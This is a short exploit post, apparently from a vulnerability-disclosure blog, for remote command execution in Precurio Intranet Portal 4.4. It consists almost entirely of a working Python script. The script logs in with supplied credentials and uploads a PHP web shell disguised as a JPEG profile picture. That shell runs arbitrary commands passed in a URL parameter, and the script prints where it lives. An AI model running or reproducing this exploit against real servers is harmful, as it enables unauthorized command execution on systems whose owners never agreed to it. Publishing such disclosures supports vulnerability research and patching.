---
layout: post
title: Precurio Intranet Portal 4.4 - Remote Command Execution
date: 2024-04-26
category: exploit
---

# Exploit Title: Precurio Intranet Portal 4.4 - Remote Command Execution
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 26.04.2024
# Vendor Homepage: https://www.precurio.com
# Software Link: http://bit.ly/1hWLtfW
# Tested Version: v4.4 (latest)
# Tested on: MacOS

```python
import requests
import time
import random
import string
import sys
import re

def simulate_login(session, url, username, password):
    try:
        print("Logging in...")
        time.sleep(1)
        login_url = f"{url}/public/default/login/submit"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "username": username,
            "password": password
        }
        response = session.post(login_url, headers=headers, data=data)
        if "Welcome System" in response.text:
            print("Login Successful!")
            time.sleep(1)
            return True
        else:
            print("Login Failed!")
            return False
    except Exception as e:
        print(f"An error occurred during login: {e}")
        return False

def upload_file(session, url):
    try:
        print("Shell Preparing...")
        time.sleep(1)
        upload_url = f"{url}/public/user/profile/update"
        random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + ".php"
        files = {
            "profile_pic": ("shell.php", '<html><body><form method="GET" name="<?php echo basename($_SERVER[\'PHP_SELF\']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET[\'cmd\'])){ system($_GET[\'cmd\']); } ?></pre></body></html>', 'image/jpeg')
        }
        response = session.post(upload_url, files=files)
        print("Upload Response Status:", response.status_code)
        if ".php" in response.text:
            path = extract_php_path(response.text)
            print(f"Your shell is ready: {url}/{path}")
        else:
            print("Exploit Failed!", response.text[:500])
    except Exception as e:
        print(f"An error occurred during file upload: {e}")

def extract_php_path(html_content):
    match = re.search(r'src="(/[^"]+\.php)"', html_content)
    if match:
        return match.group(1)
    return "Path not found"

if __name__ == "__main__":
    try:
        if len(sys.argv) != 4:
            print("Usage: python script.py <url> <username> <password>")
            sys.exit(1)

        session = requests.Session()
        url = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]

        if simulate_login(session, url, username, password):
            upload_file(session, url)
        else:
            print("Cannot proceed without a valid login.")
    except Exception as e:
        print(f"An error occurred: {e}")
